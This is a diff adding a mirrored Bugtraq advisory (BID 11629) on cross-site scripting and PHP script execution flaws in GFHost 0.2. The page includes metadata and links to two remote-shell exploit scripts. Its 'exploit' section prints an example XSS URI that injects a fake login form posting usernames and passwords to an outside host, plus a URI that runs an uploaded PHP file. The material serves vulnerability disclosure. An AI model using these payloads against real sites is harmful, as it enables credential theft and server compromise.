@@ -1,0 +1,97 @@
+#SpeeDr00t@Black Falcon<br>#bid11629<p><b><span style="font-size: 18pt;">GFHost Cross-Site Scripting And Server-Side Script Execution Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/11629/info">info</a><br><a href="http://www.securityfocus.com/bid/11629/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/11629/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/11629/solution">solution</a><br><a href="http://www.securityfocus.com/bid/11629/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				11629
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Nov 08 2004 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Nov 08 2004 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Lostmon &lt;lostmon@gmail.com&gt; disclosed these vulnerabilities.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Pablo Hernandez GFHost 0.2 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>#<a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x12000/11629/gfHostRemoteShellExploit.pl">#exploit_gfHostRemoteShellExploit.pl</a><br><a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x12000/11629/GFHostExploit.pl">#exploit_GFHostExploit.pl</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	An exploit is not required.<br/><br/>An example URI sufficient to exploit the cross-site scripting vulnerability:<br/>http://www.example1.com/label.php?label=%3Cbody%3E%3Cform%20action=http://www.example2.com/save.php%20<br/>method=post%3EUsername:%3Cinput%20name=username%20type=text%20maxlength=30%3E%3Cbr%3EPassword:<br/>%3Cinput%20name=password%20type=text%20maxlength=30%3E%3Cbr%3E%3Cinput%20name=login%20type=<br/>submit%20value=Login%3E%3C/form%3E%3C/body<br/><br/>An example URI sufficient to trigger the execution of a PHP script attachment:<br/>http://www.example.com/dl.php?a=0.1&amp;OUR_FILE=ff24404eeac528b&amp;f=file.php<br/><br/>The following exploit reportedly spawns a shell type application facilitating access to the underlying system:
+	
+		<ul>
+<li><a href="/data/vulnerabilities/exploits/gfHostRemoteShellExploit.pl">/data/vulnerabilities/exploits/gfHostRemoteShellExploit.pl</a></li>
+<li><a href="/data/vulnerabilities/exploits/GFHostExploit.pl">/data/vulnerabilities/exploits/GFHostExploit.pl</a></li>
+</ul>
+</div>
